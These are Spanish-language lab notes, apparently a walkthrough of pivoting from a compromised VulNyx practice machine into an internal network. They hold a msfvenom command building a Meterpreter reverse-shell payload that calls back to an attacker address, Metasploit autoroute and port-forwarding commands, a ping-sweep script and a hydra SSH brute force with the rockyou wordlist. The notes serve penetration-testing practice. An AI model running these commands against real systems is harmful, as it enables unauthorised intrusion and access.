Usaremos la máquina friendly 1 intermedia y la máquina basic de vulnyx máquina final:
![[Pasted image 20231112175352.png]]
Procedemos con la intrusión en la máquina friendly 1 hasta ser usuario root:
![[Pasted image 20231112180130.png]]
Ahora vamos a recibir esta conexión como meterpreter en la máquina atacante, por lo que creamos un nuevo payload con msfvenom:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
```
Y nos lo compartimos con la máquina víctima:
![[Pasted image 20231112180330.png]]
![[Pasted image 20231112180341.png]]
Y usamos el multi/handler de metasploit cargando el payload de meterpreter:
```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```
![[Pasted image 20231112180455.png]]
![[Pasted image 20231112180530.png]]
Y recibimos el meterpreter:
![[Pasted image 20231112180542.png]]
Vemos las interfaces de red con el comando ipconfig, donde identificamos la segunda interfaz de red:
![[Pasted image 20231112180611.png]]
Enrutamos el tráfico con el módulo de autoroute:
```bash
use /multi/manage/autoroute
```
![[Pasted image 20231112180736.png]]
Y ahora tenemos que encontrar equipos levantados dentro de esta red interna de 10.10.10.0/24, por lo que usamos el siguiente script:
```bash
#!/bin/bash

for i in {1..255}; do
    timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
    if [ $? -eq 0 ]; then
        echo "El host 10.10.10.$i está activo"
    fi
done
```
Lo compartimos:
![[Pasted image 20231112180923.png]]
Lo recibimos:
![[Pasted image 20231112181016.png]]
Y encontramos el host objetivo:
![[Pasted image 20231112181055.png]]
Ahora tenemos que hacerle un escaneo de puertos a esta dirección IP, por lo que usamos el módulo de portscan/tcp:
![[Pasted image 20231112181214.png]]
Y con los siguientes comandos realizamos el port forwarding, de tal forma que nos vamos a traer tanto el puerto 22 como el puerto 631:
```bash
portfwd add -l 222 -p 22 -r 10.10.10.8
portfwd add -l 631 -p 631 -r 10.10.10.8
```
![[Pasted image 20231112181340.png]]
Y aquí vemos el contenido de lo que corre por el puerto 631:
![[Pasted image 20231112181426.png]]
Detectamos el usuario:
![[Pasted image 20231112181437.png]]
Por lo que atacamos al puerto ssh que también nos hemos traído en el puerto 222 de mi máquina local:
```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
```
